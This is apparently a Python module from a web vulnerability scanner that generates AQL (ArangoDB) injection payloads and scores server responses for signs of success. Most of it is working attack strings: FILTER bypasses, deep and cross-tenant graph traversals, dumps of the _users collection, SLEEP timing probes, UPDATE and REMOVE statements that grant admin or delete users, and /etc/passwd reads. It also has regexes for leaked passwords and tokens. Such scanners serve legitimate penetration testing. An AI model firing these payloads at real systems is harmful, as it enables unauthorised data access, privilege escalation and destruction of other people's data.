"""
AQL (ArangoDB Query Language) injection payloads and response analysis.

Covers:
  - Syntax breaking / FILTER bypass
  - Graph traversal abuse (depth bombs, direction flipping, cross-tenant)
  - Time-based blind (SLEEP)
  - Collection/document enumeration
  - Comment injection
  - Bind-variable escape attempts
"""

import re

# ── Canary values for detection ───────────────────────────────────────────
AQL_CANARY = "EPT_AQL_7x9k3m"
AQL_MATH_RESULT = "9799447"  # 1337 * 7331

# ── ArangoDB error patterns ──────────────────────────────────────────────
_ERROR_PATTERNS = [
    re.compile(p, re.IGNORECASE) for p in [
        # AQL parse / syntax errors
        r"AQL:\s*syntax error",
        r"ArangoError",
        r"AQL query error",
        r"query specification invalid",
        r"expecting\s+(FILTER|FOR|RETURN|LET|COLLECT|SORT|LIMIT|INSERT|UPDATE|REPLACE|REMOVE|UPSERT)",
        r"unexpected\s+(token|character|end of query)",
        r"bind parameter .* (was not declared|undeclared)",
        r"variable .* is (unknown|not declared)",
        r"collection .* not found",
        r"document not found",
        # Graph-specific errors
        r"graph .* not found",
        r"invalid traversal depth",
        r"edge collection .* not found",
        r"expecting.*graph name",
        r"TRAVERSAL.*error",
        # Generic arango HTTP errors
        r'"errorNum"\s*:\s*\d+',
        r'"errorMessage"\s*:',
        r'"error"\s*:\s*true',
        r"ERROR_QUERY",
        r"ERROR_ARANGO",
        # Python driver errors
        r"AQLQueryExecuteError",
        r"ArangoServerError",
        r"DocumentGetError",
        r"GraphTraverseError",
        r"CollectionListError",
    ]
]

# Patterns that indicate data leakage
_LEAK_PATTERNS = [
    re.compile(p, re.IGNORECASE) for p in [
        r'"_key"\s*:',
        r'"_id"\s*:',
        r'"_rev"\s*:',
        r'"_from"\s*:',
        r'"_to"\s*:',
        r'"password"\s*:',
        r'"passwordHash"\s*:',
        r'"secret"\s*:',
        r'"token"\s*:',
        r'"apiKey"\s*:',
    ]
]

# Graph traversal data indicators
_GRAPH_LEAK_PATTERNS = [
    re.compile(p, re.IGNORECASE) for p in [
        r'"vertices"\s*:',
        r'"edges"\s*:',
        r'"paths"\s*:',
        r'"_from"\s*:.*"_to"\s*:',
    ]
]


def generate_payloads(context: dict) -> list[str]:
    """Full AQL injection payload set."""
    oob_url = context.get("oob_url", "https://deviation.cc")
    payloads = []

    # ── 1. Syntax breaking / FILTER bypass ────────────────────────────
    payloads.extend([
        # Basic string escape attempts
        "' OR true //",
        '" OR true //',
        "' OR 1==1 //",
        "') OR true //",
        '") OR true //',
        "' OR true RETURN doc //",

        # Close a FILTER and inject new logic
        "' FILTER true RETURN doc //",
        "' LET x = 1 FILTER true RETURN x //",

        # Try to break out of bind variable context
        "@value' OR true //",
        "\\' OR true //",

        # Null / type confusion
        "null",
        "true",
        "false",
        "[]",
        "{}",
    ])

    # ── 2. Graph traversal abuse ──────────────────────────────────────
    payloads.extend([
        # Excessive depth — resource exhaustion / data leak
        "' FOR v, e, p IN 1..100 ANY @start GRAPH 'default' RETURN v //",
        "' FOR v IN 1..50 ANY @start GRAPH 'default' RETURN v //",
        "' FOR v, e, p IN 1..999 OUTBOUND @start GRAPH 'default' RETURN p //",

        # Direction flipping — access inbound edges (reverse relationships)
        "' FOR v IN 1..3 INBOUND @start GRAPH 'default' RETURN v //",
        "' FOR v IN 1..3 ANY @start GRAPH 'default' RETURN v //",

        # Named graph enumeration
        "' FOR g IN _graphs RETURN g //",
        "' RETURN GRAPH_LIST() //",

        # Traverse with edge collection directly (bypass graph name)
        "' FOR v, e IN 1..5 OUTBOUND @start edges RETURN {v, e} //",

        # Shortest path (different traversal mode)
        "' FOR v IN SHORTEST_PATH @start TO 'Users/admin' ANY GRAPH 'default' RETURN v //",

        # K_SHORTEST_PATHS
        "' FOR p IN K_SHORTEST_PATHS @start TO 'Users/admin' ANY GRAPH 'default' RETURN p //",

        # Graph with PRUNE — trying to bypass filters
        "' FOR v, e, p IN 1..10 OUTBOUND @start GRAPH 'default' PRUNE true RETURN v //",
    ])

    # ── 3. Collection / document enumeration ──────────────────────────
    payloads.extend([
        # List all collections
        "' FOR c IN _collections RETURN c.name //",
        "' RETURN COLLECTIONS() //",

        # Access system collections
        "' FOR u IN _users RETURN u //",
        "' FOR doc IN _graphs RETURN doc //",
        "' FOR doc IN _jobs RETURN doc //",
        "' FOR doc IN _queues RETURN doc //",

        # Direct document access by key
        f"' RETURN DOCUMENT('_users/root') //",
        f"' RETURN DOCUMENT('Users/admin') //",

        # Cross-collection access
        "' FOR doc IN Users RETURN doc //",
        "' FOR doc IN Organisations RETURN doc //",
        "' FOR doc IN Workspaces RETURN doc //",
        "' FOR doc IN Roles RETURN doc //",
        "' FOR doc IN DataPoints RETURN doc //",
        "' FOR doc IN Schemas RETURN doc //",

        # Collection count (info leak)
        "' RETURN LENGTH(Users) //",
        "' RETURN LENGTH(Organisations) //",
    ])

    # ── 4. Time-based blind ───────────────────────────────────────────
    payloads.extend([
        "' LET s = SLEEP(3) FILTER true RETURN 1 //",
        "' OR SLEEP(3)==0 //",
        "' LET x = (FOR i IN 1..1000000 RETURN i) RETURN LENGTH(x) //",
    ])

    # ── 5. Data modification attempts ─────────────────────────────────
    payloads.extend([
        # These should be blocked but test anyway
        f"' INSERT {{_key: '{AQL_CANARY}'}} INTO _test //",
        "' UPDATE @key WITH {role: 'admin'} IN Users //",
        "' REMOVE @key IN Users //",
        "' UPSERT {_key: @key} INSERT {admin: true} UPDATE {admin: true} IN Users //",
    ])

    # ── 6. Comment injection ──────────────────────────────────────────
    payloads.extend([
        "/* comment */",
        "// comment\nFOR doc IN Users RETURN doc",
        "' /* */ OR true //",
        "' // \nFOR doc IN _users RETURN doc",
    ])

    # ── 7. AQL function abuse ─────────────────────────────────────────
    payloads.extend([
        # Math canary for expression evaluation detection
        "' RETURN 1337 * 7331 //",

        # String functions that might leak info
        f"' RETURN CONCAT('{AQL_CANARY}') //",
        "' RETURN CURRENT_USER() //",
        "' RETURN CURRENT_DATABASE() //",
        "' RETURN VERSION() //",

        # File system access (arangosh only, but test anyway)
        "' RETURN TO_STRING(CALL('fs.read', '/etc/passwd')) //",

        # Dynamic AQL (if server uses db._query with string concat)
        f"1337; FOR doc IN Users RETURN doc",
        f"1337}} FOR doc IN Users RETURN doc //",
    ])

    # ── 8. Boundary inputs (no oversized — that's in size tests) ─────
    payloads.extend([
        "",                          # empty
        " ",                         # whitespace
        "\x00",                      # null byte
        "../../../etc/passwd",       # path traversal
        "{{7*7}}",                   # SSTI probe (cross-check)
    ])

    return payloads


def generate_quick_payloads(context: dict) -> list[str]:
    """High-signal subset for fast scanning."""
    return [
        "' OR true //",
        "' FOR v IN 1..10 ANY @start GRAPH 'default' RETURN v //",
        "' FOR c IN _collections RETURN c.name //",
        "' LET s = SLEEP(3) FILTER true RETURN 1 //",
    ]


def generate_graph_payloads(context: dict) -> list[str]:
    """Graph-traversal-focused payloads — the primary interest."""
    org_id = context.get("org_id", "")
    workspace_id = context.get("workspace_id", "")

    payloads = [
        # ── Depth manipulation ────────────────────────────────────────
        # Normal depth (baseline comparison)
        "' FOR v, e IN 1..1 OUTBOUND @start GRAPH 'default' RETURN v //",
        # Escalating depth
        "' FOR v, e IN 1..5 OUTBOUND @start GRAPH 'default' RETURN v //",
        "' FOR v, e IN 1..20 OUTBOUND @start GRAPH 'default' RETURN v //",
        "' FOR v, e IN 1..100 OUTBOUND @start GRAPH 'default' RETURN v //",
        "' FOR v, e IN 0..50 OUTBOUND @start GRAPH 'default' RETURN v //",

        # ── Direction attacks ─────────────────────────────────────────
        "' FOR v, e IN 1..5 INBOUND @start GRAPH 'default' RETURN v //",
        "' FOR v, e IN 1..5 ANY @start GRAPH 'default' RETURN v //",
        "' FOR v, e IN 1..10 ANY @start GRAPH 'default' RETURN {vertex: v, edge: e} //",

        # ── Full path return (maximum info) ───────────────────────────
        "' FOR v, e, p IN 1..10 ANY @start GRAPH 'default' RETURN p //",
        "' FOR v, e, p IN 1..10 OUTBOUND @start GRAPH 'default' RETURN {path: p, v: v} //",

        # ── Cross-tenant traversal ────────────────────────────────────
        # Try starting from a different org's node
        "' FOR v IN 1..5 ANY 'Organisation/00000000000000000000000000' GRAPH 'default' RETURN v //",
        # Try accessing workspace from another org
        "' FOR v IN 1..5 OUTBOUND 'Workspace/00000000000000000000000000' GRAPH 'default' RETURN v //",

        # ── Edge collection direct access ─────────────────────────────
        "' FOR e IN edges RETURN e //",
        "' FOR e IN belongs_to RETURN e //",
        "' FOR e IN has_member RETURN e //",
        "' FOR e IN owns RETURN e //",
        "' FOR e IN references RETURN e //",
        "' FOR e IN contains RETURN e //",
        "' FOR e IN parent_of RETURN e //",

        # ── Named graph enumeration ───────────────────────────────────
        "' FOR g IN _graphs RETURN g //",
        "' RETURN GRAPH_LIST() //",
        "' FOR g IN _graphs RETURN {name: g._key, edges: g.edgeDefinitions} //",

        # ── Shortest path to sensitive nodes ──────────────────────────
        "' FOR v IN SHORTEST_PATH @start TO 'Users/admin' ANY GRAPH 'default' RETURN v //",
        "' FOR p IN K_SHORTEST_PATHS @start TO 'Organisation/admin' ANY GRAPH 'default' LIMIT 5 RETURN p //",

        # ── Neighbor enumeration ──────────────────────────────────────
        "' FOR v IN 1..1 ANY @start GRAPH 'default' RETURN DISTINCT v._id //",
        "' FOR v IN 1..2 ANY @start GRAPH 'default' COLLECT coll = PARSE_IDENTIFIER(v._id).collection RETURN coll //",

        # ── Filter bypass on traversal ────────────────────────────────
        "' FOR v, e, p IN 1..10 OUTBOUND @start GRAPH 'default' FILTER true RETURN v //",
        "' FOR v, e, p IN 1..10 OUTBOUND @start GRAPH 'default' PRUNE false RETURN v //",

        # ── Subquery traversal ────────────────────────────────────────
        "' LET neighbors = (FOR v IN 1..3 ANY @start GRAPH 'default' RETURN v) RETURN neighbors //",
        "' LET paths = (FOR v, e, p IN 1..5 ANY @start GRAPH 'default' RETURN p) RETURN LENGTH(paths) //",
    ]

    # If we have real IDs, generate cross-access payloads
    if org_id:
        payloads.extend([
            f"' FOR v IN 1..5 ANY 'Organisation/{org_id}' GRAPH 'default' RETURN v //",
            f"' FOR v IN 1..3 OUTBOUND 'Organisation/{org_id}' GRAPH 'default' RETURN v._id //",
        ])
    if workspace_id:
        payloads.extend([
            f"' FOR v IN 1..5 ANY 'Workspace/{workspace_id}' GRAPH 'default' RETURN v //",
            f"' FOR v IN 1..3 INBOUND 'Workspace/{workspace_id}' GRAPH 'default' RETURN v //",
        ])

    return payloads


def analyze_response(baseline: dict, test_response: dict, payload: str) -> dict:
    """Analyze a response for signs of AQL injection success.

    Returns dict with: is_vulnerable, confidence, details, evidence
    """
    evidence = []
    status = test_response.get("status_code", 0)
    body = test_response.get("body", "")
    elapsed = test_response.get("response_time_ms", 0)
    base_status = baseline.get("status_code", 0)
    base_body = baseline.get("body", "")
    base_elapsed = baseline.get("response_time_ms", 0)

    # ── 1. ArangoDB error messages (info leak even if not exploitable) ─
    # Skip on 404/422 — those are normal "not found" / "bad input" responses
    if status not in (404, 422):
        for pat in _ERROR_PATTERNS:
            m = pat.search(body)
            if m and not pat.search(base_body):
                evidence.append(f"ArangoDB error pattern: {m.group()}")

    # ── 2. Data leak patterns ─────────────────────────────────────────
    for pat in _LEAK_PATTERNS:
        if pat.search(body) and not pat.search(base_body):
            evidence.append(f"Data leak: {pat.pattern}")

    # ── 3. Graph traversal data in response ───────────────────────────
    for pat in _GRAPH_LEAK_PATTERNS:
        if pat.search(body) and not pat.search(base_body):
            evidence.append(f"Graph data leak: {pat.pattern}")

    # ── 4. Canary detection ───────────────────────────────────────────
    if AQL_CANARY in body:
        evidence.append(f"AQL canary string found: {AQL_CANARY}")
    if AQL_MATH_RESULT in body and AQL_MATH_RESULT not in base_body:
        evidence.append(f"AQL math evaluation: {AQL_MATH_RESULT}")

    # ── 5. Time-based detection ───────────────────────────────────────
    if "SLEEP" in payload.upper() and elapsed > base_elapsed + 2500:
        evidence.append(
            f"Time-based: {elapsed:.0f}ms vs baseline {base_elapsed:.0f}ms "
            f"(+{elapsed - base_elapsed:.0f}ms)"
        )

    # ── 6. Status code anomalies ──────────────────────────────────────
    if status == 500 and base_status != 500:
        evidence.append(f"Server error: {status} (baseline was {base_status})")

    # Auth bypass: 401/403 baseline became 200
    if base_status in (401, 403) and status == 200:
        evidence.append(f"Auth bypass: {base_status} -> {status}")

    # ── 7. Response size anomaly (data exfil) ─────────────────────────
    base_len = len(base_body)
    test_len = len(body)
    if base_len > 0 and test_len > base_len * 3 and test_len - base_len > 500:
        evidence.append(
            f"Response size anomaly: {test_len} chars vs baseline {base_len} "
            f"({test_len / base_len:.1f}x larger)"
        )

    # ── Scoring ───────────────────────────────────────────────────────
    if not evidence:
        return {
            "is_vulnerable": False,
            "confidence": "low",
            "details": "No indicators found",
            "evidence": [],
        }

    # High confidence: canary, time-based, auth bypass, graph data leak
    high_signals = [e for e in evidence if any(k in e.lower() for k in
                    ("canary", "time-based", "auth bypass", "graph data leak",
                     "math evaluation"))]
    # Medium: error messages, data leak, size anomaly
    medium_signals = [e for e in evidence if any(k in e.lower() for k in
                      ("data leak", "size anomaly", "server error"))]

    if high_signals:
        confidence = "high"
    elif medium_signals:
        confidence = "medium"
    else:
        confidence = "low"

    is_vulnerable = confidence in ("high", "medium")

    return {
        "is_vulnerable": is_vulnerable,
        "confidence": confidence,
        "details": "; ".join(evidence),
        "evidence": evidence,
    }
